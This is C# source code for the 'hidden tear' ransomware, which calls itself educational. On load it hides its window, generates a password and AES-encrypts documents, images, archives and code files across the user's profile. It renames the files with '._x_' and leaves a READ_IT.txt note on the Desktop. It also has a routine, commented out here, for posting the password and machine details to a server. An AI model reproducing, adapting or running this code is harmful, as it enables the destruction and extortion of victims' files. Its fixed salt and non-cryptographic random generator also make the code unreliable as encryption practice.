/*
 _     _     _     _              _                  
| |   (_)   | |   | |            | |                 
| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
 
 * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com | Recoded by charlybs
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 * 
 * 
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        string targetURL = "http://localhost/info/index.php";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
        

        
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            Random rnd = new Random();
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--){
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
            
        }

        //Sends created password target location - POST request
        public void SendPassword(string password){
           
            using (var client = new WebClient())
            {
                var values = new NameValueCollection();
                values["computerName"] = computerName;
                values["userName"] = userName;
                values["password"] = password;
                //client.UploadValues(targetURL, "POST", values);
                //Console.WriteLine(Encoding.Default.GetString(client.UploadValues(targetURL, "POST", values)));
            }
        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {
            try
            {
                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                File.WriteAllBytes(file, bytesEncrypted);
                System.IO.File.Move(file, file + "._x_");
            }
            catch (Exception exception)
            {
                //OutOfMemoryException
            }
            
        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {

            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".JPG", ".jpg", ".jpeg", ".JPEG", ".GIF", ".gif", ".mp3", ".m4a", ".MP3", ".wav", ".pdf", ".exe", ".EXE", ".RAW", ".bat", ".json", ".JSON",
                ".PDF", ".doc", ".DOC", ".txt", ".TXT", ".png", ".PNG", ".cs", ".c", ".java", ".h", ".DOCX", ".dll", ".DLL", ".rar", ".zip", ".7zip", ".raw",
                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };
          
            


            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);

            if (!location.Contains("\\AppData\\")) {
                for (int i = 0; i < files.Length; i++)
                {

                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension) && extension != "_x_")
                    {
                        if (!files[i].Contains("hidden-tear-decrypter.exe") && !files[i].Contains("READ_IT.txt")) {
                            EncryptFile(files[i], password);
                        }
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    encryptDirectory(childDirectories[i], password);
                }
            }
            
        }

        public void startAction()
        {
            string password = CreatePassword(255);
            string path = "\\";
            string startPath = userDir + userName + path;
            SendPassword(password);
            encryptDirectory(startPath,password);
            if (!System.IO.File.Exists(startPath+"Desktop\\READ_IT.txt")) {
                messageCreator(password);
            }
            password = null;
            System.Windows.Forms.Application.Exit();
        }

        public void messageCreator(string psswd)
        {
            string path = "\\Desktop\\READ_IT.txt"; 
            string fullpath = userDir + userName + path;
            string[] lines = { "Files has been encrypted with hidden tear", "Run 'hidden-tear-decrypter.exe' for decrypt all files.", "PASSWORD: "+psswd};
            System.IO.File.Delete(@fullpath);
            System.IO.File.WriteAllLines(fullpath, lines);
        }
    }
}
